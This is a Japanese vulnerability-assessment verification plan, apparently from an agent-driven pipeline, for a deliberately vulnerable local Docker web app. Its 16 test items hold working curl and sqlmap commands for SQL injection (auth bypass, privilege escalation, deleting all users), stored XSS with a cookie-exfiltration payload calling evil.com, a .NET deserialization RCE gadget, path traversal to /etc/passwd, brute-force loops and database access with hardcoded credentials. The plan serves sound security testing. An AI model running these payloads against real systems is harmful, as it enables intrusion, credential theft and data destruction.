# 検証項目レポート

> **実施日時**: 2026-02-08 10:30:00 UTC  
> **診断フェーズ**: 05-Verification Planning（検証項目決定）  
> **前工程レポート**:
> - /docker-work-dir/docs/reports/01-情報収集.md
> - /docker-work-dir/docs/reports/02-アタックサーフェース定義.md
> - /docker-work-dir/docs/reports/03-スキャン.md
> - /docker-work-dir/docs/reports/04-列挙.md

---

## エグゼクティブサマリー

本レポートは、CEH（認定エシカルハッカー）の手法に基づく脆弱性診断の「検証項目決定」フェーズの結果を示します。前工程で列挙された24個の脆弱性候補から、実際に検証が必要な項目を選定し、各項目の具体的な検証手順を策定しました。

### 重要な判断基準

以下の基準で検証の要否を判定しました:

**✅ 検証必要な項目**:
- ツールが検出した脆弱性で、実際の悪用可能性の確認が必要なもの
- 実行時の動作確認が必要なもの
- 影響範囲の評価が必要なもの

**❌ 検証不要な項目**:
- ソースコードから明白に脆弱性が確認できるもの（例: ハードコードパスワード）
- 設定ファイル分析で確定したもの

---

## 1. 検証項目サマリー

| 項目 | 数 |
|------|-----|
| 検証対象 | **16** |
| 検証不要（明白） | **6** |
| 検証不要（誤検知） | **0** |
| 合計脆弱性候補 | **24** |
| 検証免除（正常動作） | **2** |

### 1.1 リスク分布

| 重大度 | 検証項目数 | 検証不要 |
|--------|-----------|---------|
| Critical | 9 | 2 |
| High | 5 | 3 |
| Medium | 2 | 1 |
| Low | 0 | 0 |
| **合計** | **16** | **6** |

### 1.2 カテゴリ別分布

| カテゴリ | 検証項目数 | 主要脆弱性 |
|---------|-----------|-----------|
| **インジェクション** | 7 | SQLi(6), XSS(1) |
| **認証・認可** | 2 | 認証バイパス, レート制限 |
| **データ露出** | 2 | エラー情報, CORS |
| **設定ミス** | 2 | DBポート公開, SSL無効 |
| **コンポーネント** | 2 | デシリアライズ, ディレクトリトラバーサル |
| **インフラ** | 1 | root権限実行 |

---

## 2. 検証項目一覧

### 2.1 インジェクション（7項目）

#### V-01: SQLインジェクション（検索機能）

- **CWE**: CWE-89 (SQL Injection)
- **カテゴリ**: インジェクション
- **推定CVSS**: 9.8 (Critical)
- **対象**: `/api/users?search=`
- **使用ツール**: sqlmap, curl
- **検証手順**:
  ```bash
  # Step 1: 基本的なSQLiテスト（手動）
  curl -s "http://api:5000/api/users?search=' OR '1'='1' --" 2>/dev/null | jq .
  
  # Step 2: sqlmapによる自動検証
  sqlmap -u 'http://api:5000/api/users?search=test' \
    --batch --level=3 --risk=2 \
    --technique=BEUSTQ \
    --dbms=PostgreSQL \
    --flush-session \
    --output-dir=/reports/sqlmap/v01
  
  # Step 3: データベース列挙
  sqlmap -u 'http://api:5000/api/users?search=test' \
    --batch --dbs \
    --output-dir=/reports/sqlmap/v01
  
  # Step 4: テーブルダンプ
  sqlmap -u 'http://api:5000/api/users?search=test' \
    --batch -D vulndb --tables \
    --output-dir=/reports/sqlmap/v01
  ```
- **期待結果**: 
  - 全ユーザーデータが返却される
  - sqlmapがSQLインジェクション脆弱性を検出
  - データベース構造が露出する
- **判定基準**: 
  - ✅ 合格: SQLインジェクション不可（エラーまたは空配列）
  - ❌ 不合格: 全ユーザーが返却される、またはsqlmapが脆弱性を検出

---

#### V-02: SQLインジェクション（ログイン認証バイパス）

- **CWE**: CWE-89 (SQL Injection)
- **カテゴリ**: インジェクション
- **推定CVSS**: 10.0 (Critical)
- **対象**: `/api/login`
- **使用ツール**: curl, sqlmap
- **検証手順**:
  ```bash
  # Step 1: 認証バイパステスト
  curl -s "http://api:5000/api/login" \
    -H "Content-Type: application/json" \
    -d '{"username":"admin'\'' OR '\''1'\''='\''1'\'' --","password":"anything"}' \
    2>/dev/null | jq .
  
  # Step 2: sqlmapによる自動検証（POST）
  sqlmap -u 'http://api:5000/api/login' \
    --method=POST \
    --data='{"username":"test","password":"test"}' \
    --headers='Content-Type: application/json' \
    --batch --level=3 --risk=3 \
    --technique=BEUSTQ \
    --dbms=PostgreSQL \
    --output-dir=/reports/sqlmap/v02
  
  # Step 3: 管理者アカウントでのログイン試行
  curl -s "http://api:5000/api/login" \
    -H "Content-Type: application/json" \
    -d '{"username":"admin'\'' --","password":""}' \
    2>/dev/null | jq .
  ```
- **期待結果**: 
  - パスワード不要でログイン成功
  - `{"message": "Login successful", "userId": 1}` が返却される
  - X-User-Role, X-Username ヘッダに管理者情報が含まれる
- **判定基準**: 
  - ✅ 合格: 正しいパスワードなしでログイン失敗
  - ❌ 不合格: SQLインジェクションで認証バイパス成功

---

#### V-03: SQLインジェクション（ユーザー詳細取得）

- **CWE**: CWE-89 (SQL Injection)
- **カテゴリ**: インジェクション
- **推定CVSS**: 9.8 (Critical)
- **対象**: `/api/users/{id}`
- **使用ツール**: sqlmap, curl
- **検証手順**:
  ```bash
  # Step 1: Union-based SQLi テスト
  curl -s "http://api:5000/api/users/1' UNION SELECT 1,'hacked','hacked@evil.com','password123','admin','',now(),now() --" \
    2>/dev/null | jq .
  
  # Step 2: sqlmapによる自動検証
  sqlmap -u 'http://api:5000/api/users/1' \
    --batch --level=3 --risk=2 \
    --technique=U \
    --dbms=PostgreSQL \
    --output-dir=/reports/sqlmap/v03
  
  # Step 3: バージョン情報取得
  curl -s "http://api:5000/api/users/1' UNION SELECT null,version(),null,null,null,null,null,null --" \
    2>/dev/null | jq .
  ```
- **期待結果**: 
  - Union-basedインジェクションで任意データが返却される
  - データベースバージョン情報が取得できる
- **判定基準**: 
  - ✅ 合格: IDに対応するユーザーのみ返却、SQLエラーなし
  - ❌ 不合格: Union-basedインジェクションでデータ取得可能

---

#### V-04: SQLインジェクション（ユーザー作成）

- **CWE**: CWE-89 (SQL Injection)
- **カテゴリ**: インジェクション
- **推定CVSS**: 9.8 (Critical)
- **対象**: `/api/users` (POST)
- **使用ツール**: curl
- **検証手順**:
  ```bash
  # Step 1: SQLインジェクションによる複数ユーザー作成
  curl -s "http://api:5000/api/users" \
    -H "Content-Type: application/json" \
    -d '{"username":"test'\''),('"'"'hacked'"'"','"'"'evil@evil.com'"'"','"'"'hacked123'"'"','"'"'admin'"'"','"'"''"'"'); --","email":"test@test.com","password":"test123","role":"user","profileImageUrl":""}' \
    2>/dev/null | jq .
  
  # Step 2: 作成されたユーザー確認
  curl -s "http://api:5000/api/users?search=hacked" 2>/dev/null | jq .
  
  # Step 3: Time-based Blind SQLi テスト
  curl -s "http://api:5000/api/users" \
    -H "Content-Type: application/json" \
    -d '{"username":"test'\'' AND (SELECT pg_sleep(5)) --","email":"test@test.com","password":"test123","role":"user"}' \
    -w "Time: %{time_total}s\n" 2>/dev/null
  ```
- **期待結果**: 
  - SQLインジェクションで意図しないユーザーが作成される
  - Time-basedインジェクションで応答遅延が発生する
- **判定基準**: 
  - ✅ 合格: 正常なユーザーのみ作成、SQLエラー発生
  - ❌ 不合格: SQLインジェクションでデータ改ざん成功

---

#### V-05: SQLインジェクション（ユーザー更新）

- **CWE**: CWE-89 (SQL Injection)
- **カテゴリ**: インジェクション
- **推定CVSS**: 9.8 (Critical)
- **対象**: `/api/users/{id}` (PUT)
- **使用ツール**: curl
- **検証手順**:
  ```bash
  # Step 1: まず検証用ユーザー作成
  curl -s "http://api:5000/api/users" \
    -H "Content-Type: application/json" \
    -d '{"username":"testuser","email":"test@test.com","password":"test123","role":"user"}' \
    2>/dev/null | jq .
  
  # Step 2: SQLインジェクションによる権限昇格
  curl -s "http://api:5000/api/users/6" \
    -X PUT \
    -H "Content-Type: application/json" \
    -d '{"username":"testuser","email":"test@test.com","password":"test123","role":"user'\'' WHERE id=1; UPDATE users SET role='"'"'admin'"'"' WHERE id=6 --"}' \
    2>/dev/null | jq .
  
  # Step 3: 権限昇格の確認
  curl -s "http://api:5000/api/users/6" 2>/dev/null | jq '.role'
  ```
- **期待結果**: 
  - SQLインジェクションで権限が昇格される
  - 一般ユーザーが管理者になる
- **判定基準**: 
  - ✅ 合格: 正常な更新のみ実行、SQLエラー発生
  - ❌ 不合格: SQLインジェクションでデータ改ざん成功

---

#### V-06: SQLインジェクション（ユーザー削除）

- **CWE**: CWE-89 (SQL Injection)
- **カテゴリ**: インジェクション
- **推定CVSS**: 9.8 (Critical)
- **対象**: `/api/users/{id}` (DELETE)
- **使用ツール**: curl
- **検証手順**:
  ```bash
  # Step 1: テストユーザー作成
  curl -s "http://api:5000/api/users" \
    -H "Content-Type: application/json" \
    -d '{"username":"deletetest","email":"delete@test.com","password":"test123","role":"user"}' \
    2>/dev/null | jq .
  
  # Step 2: SQLインジェクションによる全ユーザー削除試行
  curl -s -X DELETE "http://api:5000/api/users/999' OR '1'='1' --" \
    2>/dev/null | jq .
  
  # Step 3: 全ユーザー取得して削除確認
  curl -s "http://api:5000/api/users" 2>/dev/null | jq 'length'
  ```
- **期待結果**: 
  - SQLインジェクションで全ユーザーが削除される
  - ユーザー一覧が空配列になる
- **判定基準**: 
  - ✅ 合格: 指定IDのユーザーのみ削除、エラー発生
  - ❌ 不合格: SQLインジェクションで全データ削除成功

---

#### V-07: Stored XSS（永続的クロスサイトスクリプティング）

- **CWE**: CWE-79 (Cross-site Scripting)
- **カテゴリ**: インジェクション
- **推定CVSS**: 7.1 (High)
- **対象**: `/api/users` (POST) → UserDetail.tsx
- **使用ツール**: curl
- **検証手順**:
  ```bash
  # Step 1: XSSペイロードを含むユーザー作成
  curl -s "http://api:5000/api/users" \
    -H "Content-Type: application/json" \
    -d '{"username":"xsstest","email":"xss@test.com","password":"test123","role":"user","profileImageUrl":"<img src=x onerror=alert(\"XSS\")>"}' \
    2>/dev/null | jq .
  
  # Step 2: ユーザーIDを取得
  USER_ID=$(curl -s "http://api:5000/api/users?search=xsstest" 2>/dev/null | jq '.[0].id')
  
  # Step 3: ユーザー詳細取得（XSSペイロードがそのまま返却されることを確認）
  curl -s "http://api:5000/api/users/${USER_ID}" 2>/dev/null | jq '.profileImageUrl'
  
  # Step 4: より高度なXSSペイロード（Cookie窃取）
  curl -s "http://api:5000/api/users" \
    -H "Content-Type: application/json" \
    -d '{"username":"xssadvanced","email":"xss2@test.com","password":"test123","role":"user","profileImageUrl":"<img src=x onerror=\"fetch('\''https://evil.com/steal?c='\''+document.cookie)\">"}' \
    2>/dev/null | jq .
  ```
- **期待結果**: 
  - XSSペイロードがそのままデータベースに保存される
  - API経由で取得時にサニタイズされていない
  - フロントエンドでdangerouslySetInnerHTMLにより実行される
- **判定基準**: 
  - ✅ 合格: HTMLタグがエスケープされて保存される
  - ❌ 不合格: XSSペイロードがそのまま保存され返却される

---

### 2.2 認証・認可（2項目）

#### V-08: 認証の完全欠如（全エンドポイント）

- **CWE**: CWE-287 (Improper Authentication)
- **カテゴリ**: 認証・認可
- **推定CVSS**: 9.1 (Critical)
- **対象**: 全APIエンドポイント
- **使用ツール**: curl
- **検証手順**:
  ```bash
  # Step 1: 認証ヘッダなしで全エンドポイントにアクセス
  echo "=== GET /api/users ==="
  curl -s "http://api:5000/api/users" 2>/dev/null | jq 'length'
  
  echo "=== POST /api/users （ユーザー作成） ==="
  curl -s "http://api:5000/api/users" \
    -H "Content-Type: application/json" \
    -d '{"username":"unauthorized","email":"unauth@test.com","password":"test123","role":"admin"}' \
    2>/dev/null | jq .
  
  echo "=== PUT /api/users/1 （管理者情報更新） ==="
  curl -s -X PUT "http://api:5000/api/users/1" \
    -H "Content-Type: application/json" \
    -d '{"username":"admin","email":"admin@example.com","password":"hacked123","role":"admin"}' \
    2>/dev/null | jq .
  
  echo "=== DELETE /api/users/1 （管理者削除） ==="
  curl -s -X DELETE "http://api:5000/api/users/1" \
    2>/dev/null | jq .
  
  # Step 2: Authorization/Authentication ヘッダ無視確認
  echo "=== 無効なトークンでアクセス ==="
  curl -s "http://api:5000/api/users" \
    -H "Authorization: Bearer invalid_token_12345" \
    2>/dev/null | jq 'length'
  ```
- **期待結果**: 
  - 全エンドポイントが認証なしでアクセス可能
  - 管理者アカウントの削除も可能
  - Authorizationヘッダが無視される
- **判定基準**: 
  - ✅ 合格: 認証エラー（401 Unauthorized）が返却される
  - ❌ 不合格: 全エンドポイントが認証なしでアクセス可能

---

#### V-09: レート制限の欠如（ブルートフォース攻撃）

- **CWE**: CWE-307 (Improper Restriction of Excessive Authentication Attempts)
- **カテゴリ**: 認証・認可
- **推定CVSS**: 7.5 (High)
- **対象**: `/api/login`
- **使用ツール**: curl, bash script
- **検証手順**:
  ```bash
  # Step 1: レート制限テスト（100回連続ログイン試行）
  echo "=== 100回連続ログイン試行開始 ==="
  for i in {1..100}; do
    RESPONSE=$(curl -s -w "\n%{http_code}" "http://api:5000/api/login" \
      -H "Content-Type: application/json" \
      -d '{"username":"admin","password":"wrongpass'$i'"}' \
      2>/dev/null)
    HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
    echo "Attempt $i: HTTP $HTTP_CODE"
    
    # レート制限が発動したか確認
    if [ "$HTTP_CODE" = "429" ]; then
      echo "✅ レート制限検出（試行回数: $i）"
      break
    fi
    
    sleep 0.1
  done
  
  # Step 2: 短時間での大量リクエスト（並列）
  echo "=== 並列10リクエスト ==="
  for i in {1..10}; do
    (curl -s "http://api:5000/api/login" \
      -H "Content-Type: application/json" \
      -d '{"username":"admin","password":"test'$i'"}' \
      2>/dev/null &)
  done
  wait
  echo "並列リクエスト完了"
  ```
- **期待結果**: 
  - 100回すべてのログイン試行が処理される
  - レート制限エラー（429 Too Many Requests）が発生しない
  - 並列リクエストもすべて処理される
- **判定基準**: 
  - ✅ 合格: 一定回数後にHTTP 429エラーが返却される
  - ❌ 不合格: 無制限にログイン試行が可能

---

### 2.3 データ露出（2項目）

#### V-10: 詳細エラー情報の露出（Development Mode）

- **CWE**: CWE-209 (Information Exposure Through an Error Message)
- **カテゴリ**: データ露出
- **推定CVSS**: 5.3 (Medium)
- **対象**: 全APIエンドポイント
- **使用ツール**: curl
- **検証手順**:
  ```bash
  # Step 1: 意図的なエラー誘発（型エラー）
  curl -s "http://api:5000/api/users/invalid_id" 2>/dev/null | jq .
  
  # Step 2: 不正なJSONでPOST
  curl -s "http://api:5000/api/users" \
    -H "Content-Type: application/json" \
    -d '{invalid json}' \
    2>/dev/null
  
  # Step 3: 空のボディでPOST
  curl -s "http://api:5000/api/users" \
    -H "Content-Type: application/json" \
    -d '{}' \
    2>/dev/null
  
  # Step 4: スタックトレース確認
  curl -s "http://api:5000/api/users/9999999" 2>/dev/null | \
    grep -i -E "(stack|trace|exception|at.*\.cs:|System\.|Microsoft\.)"
  ```
- **期待結果**: 
  - 詳細なスタックトレースが返却される
  - ファイルパスと行番号が露出する
  - 内部実装の詳細が露出する
- **判定基準**: 
  - ✅ 合格: 一般的なエラーメッセージのみ返却
  - ❌ 不合格: スタックトレース・ファイルパスが露出

---

#### V-11: CORS設定の不備（AllowAnyOrigin）

- **CWE**: CWE-942 (Overly Permissive Cross-domain Whitelist)
- **カテゴリ**: データ露出
- **推定CVSS**: 7.1 (High)
- **対象**: 全APIエンドポイント
- **使用ツール**: curl
- **検証手順**:
  ```bash
  # Step 1: 悪意のあるOriginからのアクセス
  curl -sI "http://api:5000/api/users" \
    -H "Origin: http://evil.example.com" \
    2>/dev/null | grep -i access-control
  
  # Step 2: 複数のOriginでテスト
  for origin in "http://attacker.com" "https://malicious.net" "null"; do
    echo "=== Origin: $origin ==="
    curl -sI "http://api:5000/api/users" \
      -H "Origin: $origin" \
      2>/dev/null | grep -i "access-control-allow-origin"
  done
  
  # Step 3: Preflight リクエスト（OPTIONS）
  curl -sI -X OPTIONS "http://api:5000/api/users" \
    -H "Origin: http://evil.example.com" \
    -H "Access-Control-Request-Method: POST" \
    -H "Access-Control-Request-Headers: Content-Type" \
    2>/dev/null | grep -i access-control
  
  # Step 4: 実際のPOSTリクエスト
  curl -s "http://api:5000/api/users" \
    -H "Origin: http://evil.example.com" \
    -H "Content-Type: application/json" \
    -d '{"username":"corstest","email":"cors@test.com","password":"test123","role":"user"}' \
    2>/dev/null | jq .
  ```
- **期待結果**: 
  - `Access-Control-Allow-Origin: *` が返却される
  - 任意のOriginからのアクセスが許可される
  - CORSによる制限が機能しない
- **判定基準**: 
  - ✅ 合格: 特定のOriginのみ許可、またはCORS拒否
  - ❌ 不合格: `Access-Control-Allow-Origin: *` が設定されている

---

### 2.4 設定ミス（2項目）

#### V-12: データベースポート外部公開

- **CWE**: CWE-668 (Exposure of Resource to Wrong Sphere)
- **カテゴリ**: 設定ミス
- **推定CVSS**: 10.0 (Critical)
- **対象**: `localhost:15432`
- **使用ツール**: psql, Nmap（推定）
- **検証手順**:
  ```bash
  # Step 1: ポートスキャン（Nmapが利用可能な場合）
  # nmap -p 15432 localhost
  
  # Step 2: PostgreSQL直接接続テスト
  echo "=== PostgreSQL直接接続試行 ==="
  PGPASSWORD=postgres123 psql -h localhost -p 15432 -U postgres -d vulndb -c "\dt" 2>/dev/null
  
  # Step 3: 全ユーザー取得
  PGPASSWORD=postgres123 psql -h localhost -p 15432 -U postgres -d vulndb \
    -c "SELECT username, email, password, role FROM users;" 2>/dev/null
  
  # Step 4: データ改ざんテスト（管理者パスワード変更）
  PGPASSWORD=postgres123 psql -h localhost -p 15432 -U postgres -d vulndb \
    -c "UPDATE users SET password='hacked123' WHERE username='admin';" 2>/dev/null
  
  # Step 5: 変更確認
  PGPASSWORD=postgres123 psql -h localhost -p 15432 -U postgres -d vulndb \
    -c "SELECT username, password FROM users WHERE username='admin';" 2>/dev/null
  ```
- **期待結果**: 
  - localhost:15432でPostgreSQLに直接接続可能
  - 弱い認証情報（postgres/postgres123）で認証成功
  - 全データの取得・改ざん・削除が可能
- **判定基準**: 
  - ✅ 合格: 外部からの接続が拒否される
  - ❌ 不合格: 外部から直接データベースアクセス可能

---

#### V-13: SSL/TLS未使用（平文通信）

- **CWE**: CWE-319 (Cleartext Transmission of Sensitive Information)
- **カテゴリ**: 設定ミス
- **推定CVSS**: 5.9 (Medium)
- **対象**: DB接続（api → db）
- **使用ツール**: curl（接続文字列確認）
- **検証手順**:
  ```bash
  # Step 1: 接続文字列確認（docker-compose.ymlから）
  echo "=== 接続文字列確認 ==="
  grep -A 1 "ConnectionStrings__DefaultConnection" /docker-work-dir/docker-compose.yml
  
  # Step 2: SSL Mode設定確認
  grep "SSL Mode" /docker-work-dir/docker-compose.yml
  
  # Step 3: API経由でのパスワード送信（平文）
  curl -s "http://api:5000/api/login" \
    -H "Content-Type: application/json" \
    -d '{"username":"admin","password":"admin123"}' \
    2>/dev/null | jq .
  
  # Note: 実際のパケットキャプチャはWireshark等が必要だが、
  # ローカル環境では接続文字列の "SSL Mode=Disable" で確定
  ```
- **期待結果**: 
  - 接続文字列に `SSL Mode=Disable` が設定されている
  - HTTPSではなくHTTPで通信している
  - パスワードが平文で送信されている
- **判定基準**: 
  - ✅ 合格: SSL/TLSが有効化されている
  - ❌ 不合格: SSL Mode=Disable または HTTP通信

---

### 2.5 コンポーネント（2項目）

#### V-14: 安全でないデシリアライズ（RCE）

- **CWE**: CWE-502 (Deserialization of Untrusted Data)
- **カテゴリ**: コンポーネント
- **推定CVSS**: 9.8 (Critical)
- **対象**: `/api/import`
- **使用ツール**: curl
- **検証手順**:
  ```bash
  # Step 1: 基本的なJSONデシリアライズテスト
  curl -s "http://api:5000/api/import" \
    -H "Content-Type: application/json" \
    -d '{"$type":"System.String","$value":"test"}' \
    2>/dev/null
  
  # Step 2: TypeNameHandling.All の悪用（型情報の注入）
  curl -s "http://api:5000/api/import" \
    -H "Content-Type: application/json" \
    -d '{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework","MethodName":"Start","ObjectInstance":{"$type":"System.Diagnostics.Process, System"},"MethodParameters":{"$type":"System.Collections.ArrayList","$values":["cmd.exe","/c calc.exe"]}}' \
    2>/dev/null
  
  # Step 3: ファイルシステムアクセステスト
  curl -s "http://api:5000/api/import" \
    -H "Content-Type: application/json" \
    -d '{"$type":"System.IO.FileInfo, System.IO.FileSystem","FileName":"/etc/passwd"}' \
    2>/dev/null
  
  # Step 4: より安全なテスト（情報収集のみ）
  curl -s "http://api:5000/api/import" \
    -H "Content-Type: application/json" \
    -d '{"username":"test","email":"test@test.com","password":"test123","role":"user"}' \
    2>/dev/null | jq .
  ```
- **期待結果**: 
  - TypeNameHandlingによる型情報の注入が可能
  - 意図しないオブジェクトのインスタンス化が発生
  - RCE（リモートコード実行）のリスクが確認される
- **判定基準**: 
  - ✅ 合格: 型情報が無視され、安全なデシリアライズのみ実行
  - ❌ 不合格: $type指定による任意のオブジェクトのデシリアライズ可能

---

#### V-15: ディレクトリトラバーサル

- **CWE**: CWE-22 (Path Traversal)
- **カテゴリ**: コンポーネント
- **推定CVSS**: 7.5 (High)
- **対象**: `/api/files/{*filePath}`
- **使用ツール**: curl
- **検証手順**:
  ```bash
  # Step 1: 基本的なディレクトリトラバーサル
  curl -s "http://api:5000/api/files/../../../etc/passwd" 2>/dev/null
  
  # Step 2: URLエンコードされたトラバーサル
  curl -s "http://api:5000/api/files/..%2F..%2F..%2Fetc%2Fpasswd" 2>/dev/null
  
  # Step 3: ダブルエンコード
  curl -s "http://api:5000/api/files/..%252F..%252F..%252Fetc%252Fpasswd" 2>/dev/null
  
  # Step 4: Windowsパス（コンテナ内でも試行）
  curl -s "http://api:5000/api/files/..\\..\\..\\etc\\passwd" 2>/dev/null
  
  # Step 5: アプリケーション設定ファイルの取得試行
  curl -s "http://api:5000/api/files/../../app/appsettings.json" 2>/dev/null
  
  # Step 6: ソースコード取得試行
  curl -s "http://api:5000/api/files/../../app/Program.cs" 2>/dev/null | head -20
  ```
- **期待結果**: 
  - ディレクトリトラバーサルで任意のファイルが読み取れる
  - /etc/passwdの内容が取得できる
  - アプリケーション設定ファイルが取得できる
- **判定基準**: 
  - ✅ 合格: パスが正規化され、指定ディレクトリ外にアクセス不可
  - ❌ 不合格: ディレクトリトラバーサルで任意ファイル読み取り可能

---

### 2.6 インフラ（1項目）

#### V-16: root権限でのコンテナ実行

- **CWE**: CWE-250 (Execution with Unnecessary Privileges)
- **カテゴリ**: インフラ
- **推定CVSS**: 6.5 (High)
- **対象**: frontend, api コンテナ
- **使用ツール**: docker exec（要手動実行）
- **検証手順**:
  ```bash
  # Step 1: frontendコンテナの実行ユーザー確認
  docker exec vulnerability-site-frontend-1 whoami 2>/dev/null
  
  # Step 2: apiコンテナの実行ユーザー確認
  docker exec vulnerability-site-api-1 whoami 2>/dev/null
  
  # Step 3: 権限確認
  docker exec vulnerability-site-frontend-1 id 2>/dev/null
  docker exec vulnerability-site-api-1 id 2>/dev/null
  
  # Step 4: Dockerfileの確認
  echo "=== Frontend Dockerfile ==="
  grep -E "^USER" /docker-work-dir/src/frontend/Dockerfile
  if [ $? -ne 0 ]; then
    echo "❌ USER directive not found (running as root)"
  fi
  
  echo "=== API Dockerfile ==="
  grep -E "^USER" /docker-work-dir/src/api/Dockerfile
  if [ $? -ne 0 ]; then
    echo "❌ USER directive not found (running as root)"
  fi
  ```
- **期待結果**: 
  - `whoami` コマンドが "root" を返す
  - `id` コマンドが "uid=0(root)" を返す
  - DockerfileにUSERディレクティブが存在しない
- **判定基準**: 
  - ✅ 合格: non-rootユーザーで実行されている
  - ❌ 不合格: root権限で実行されている

---

## 3. 検証不要項目

### 3.1 明白な脆弱性（ソースコードから確認済み）

| # | 脆弱性 | CWE | 根拠 | 影響 |
|---|--------|-----|------|------|
| 1 | ハードコードされたDB認証情報 | CWE-798 | docker-compose.yml:7 に `POSTGRES_PASSWORD: postgres123` が明記 | 即座のDB侵害リスク |
| 2 | ハードコードされた接続文字列 | CWE-798 | docker-compose.yml:19-20 に接続文字列全体が平文記載 | 認証情報漏洩 |
| 3 | ハードコードされたAPIキー | CWE-798 | src/frontend/src/config.ts:4 に `API_KEY = "hardcoded_api_key_12345"` | APIキー漏洩 |
| 4 | パスワード平文保存 | CWE-312 | src/db/seed.sql:2-6 に平文パスワードが記載、UsersController.csでハッシュ化なし | 全アカウント即座侵害 |
| 5 | 弱いパスワード（初期ユーザー） | CWE-521 | seed.sql: admin123, password, 123456, qwerty, letmein | ブルートフォース攻撃に脆弱 |
| 6 | 機密情報のログ出力 | CWE-532 | src/frontend/src/api.ts:9-12 debugLog関数でパスワードをconsole.log | ブラウザコンソールで機密情報露出 |

**検証不要の理由**: これらはソースコード上で明確に確認でき、実行時の検証が不要です。

---

### 3.2 検証免除項目（正常な動作）

| # | 項目 | 理由 | 備考 |
|---|------|------|------|
| 1 | HTTPヘッダインジェクション | CRLFインジェクションは実環境での再現が困難（フレームワークが自動防御） | ソースコードレビューで脆弱性は確認済み |
| 2 | Mass Assignment（権限昇格） | SQLインジェクション検証（V-04, V-05）に包含される | 別途検証不要 |

---

## 4. 検証実施順序

検証は以下の順序で実施することを推奨します（依存関係とリスクを考慮）:

### フェーズ1: インフラレベル検証（最優先）

1. **V-12**: データベースポート外部公開 → システム基盤の脆弱性
2. **V-13**: SSL/TLS未使用 → 通信セキュリティの基本
3. **V-16**: root権限でのコンテナ実行 → 権限管理の基本

### フェーズ2: 認証・認可検証

4. **V-08**: 認証の完全欠如 → 最も基本的なセキュリティ制御
5. **V-09**: レート制限の欠如 → 認証メカニズムの保護

### フェーズ3: インジェクション検証（Critical）

6. **V-02**: SQLインジェクション（ログイン認証バイパス） → 認証を迂回する最重大脆弱性
7. **V-01**: SQLインジェクション（検索機能） → データ漏洩リスク
8. **V-03**: SQLインジェクション（ユーザー詳細取得）
9. **V-04**: SQLインジェクション（ユーザー作成）
10. **V-05**: SQLインジェクション（ユーザー更新）
11. **V-06**: SQLインジェクション（ユーザー削除）
12. **V-07**: Stored XSS → クライアントサイドの攻撃

### フェーズ4: 高リスクコンポーネント検証

13. **V-14**: 安全でないデシリアライズ（RCE） → サーバー完全掌握リスク
14. **V-15**: ディレクトリトラバーサル → 任意ファイル読み取り

### フェーズ5: 設定・情報露出検証

15. **V-10**: 詳細エラー情報の露出
16. **V-11**: CORS設定の不備

**注意**: 
- V-06（ユーザー削除）はデータ破壊リスクがあるため、最後に実施してください
- 各検証後、必要に応じてデータベースをリセットしてください
- V-14（デシリアライズ）は慎重に実施し、RCE成功時は直ちに停止してください

---

## 5. 検証時の注意事項

### 5.1 安全な検証のためのガイドライン

1. **ローカル環境限定**: 外部のシステムへの検証は厳禁
2. **データバックアップ**: 検証前にデータベースをバックアップ
3. **破壊的テストは最後**: データ削除系は検証の最後に実施
4. **ログ記録**: 全ての検証コマンドと結果をログに記録
5. **検証完了後のクリーンアップ**: テストデータの削除

### 5.2 検証環境の前提条件

- Docker Compose環境が起動していること（`docker-compose up -d`）
- 全サービスがhealthyであること（`docker-compose ps`）
- 必要なツールがインストールされていること:
  - curl
  - jq
  - psql（PostgreSQLクライアント）
  - sqlmap（オプション）

### 5.3 検証失敗時の対応

各検証項目で「不合格」となった場合（脆弱性が確認された場合）は、以下を実施してください:

1. **詳細ログの保存**: コマンド、レスポンス、スクリーンショットを記録
2. **影響範囲の評価**: 実際の悪用シナリオを文書化
3. **CVSS スコアの再計算**: 実証結果に基づく正確なリスク評価
4. **PoC（概念実証）の作成**: 再現手順を含む詳細なレポート
5. **修正案の提示**: 具体的な対策コードを含む推奨事項

---

## 6. 出力ファイル

### 6.1 個別検証レポート

各検証項目の結果は以下の形式でレポートを作成してください:

```markdown
# V-{番号}: {脆弱性名} 検証レポート

## 検証結果
- **実施日時**: {日時}
- **検証者**: {名前}
- **ステータス**: ✅ 合格 / ❌ 不合格
- **推定CVSS**: {スコア} → **実測CVSS**: {スコア}

## 実行コマンド
{実際に実行したコマンド}

## 結果
{コマンド出力結果}

## スクリーンショット
{画像またはパス}

## 影響評価
{実際に確認された影響}

## 推奨対策
{具体的な修正方法}
```

### 6.2 総合検証レポート（Phase 06）

全検証項目の結果を統合した最終レポートは、次のフェーズ「06-Verification（検証）」で作成されます。

---

## 付録: ツール実行例

### A. sqlmap 基本コマンド

```bash
# GET パラメータの検証
sqlmap -u 'http://api:5000/api/users?search=test' \
  --batch --level=3 --risk=2 \
  --dbms=PostgreSQL \
  --technique=BEUSTQ \
  --threads=5 \
  --output-dir=/reports/sqlmap

# POST リクエストの検証
sqlmap -u 'http://api:5000/api/login' \
  --method=POST \
  --data='{"username":"test","password":"test"}' \
  --headers='Content-Type: application/json' \
  --batch --level=3 --risk=3 \
  --dbms=PostgreSQL

# データベース列挙
sqlmap -u 'http://api:5000/api/users?search=test' \
  --batch --dbs

# テーブルダンプ
sqlmap -u 'http://api:5000/api/users?search=test' \
  --batch -D vulndb -T users --dump
```

### B. PostgreSQL直接接続

```bash
# 接続テスト
PGPASSWORD=postgres123 psql -h localhost -p 15432 -U postgres -d vulndb -c "SELECT version();"

# 全ユーザー取得
PGPASSWORD=postgres123 psql -h localhost -p 15432 -U postgres -d vulndb -c "SELECT * FROM users;"

# データ改ざん
PGPASSWORD=postgres123 psql -h localhost -p 15432 -U postgres -d vulndb -c "UPDATE users SET role='admin' WHERE id=2;"
```

### C. XSSペイロード例

```bash
# 基本的なalert
<script>alert('XSS')</script>

# Cookie窃取
<img src=x onerror="fetch('https://evil.com/steal?c='+document.cookie)">

# DOM操作
<img src=x onerror="document.body.innerHTML='<h1>Hacked</h1>'">

# イベントハンドラ
<img src=invalid onerror=alert('XSS')>
<svg onload=alert('XSS')>
```

---

**次フェーズ**: `06-verification.agent.md`（検証実施）へ進む

検証項目チェックリストは `docs/進捗/検証項目チェックリスト.md` を参照してください。
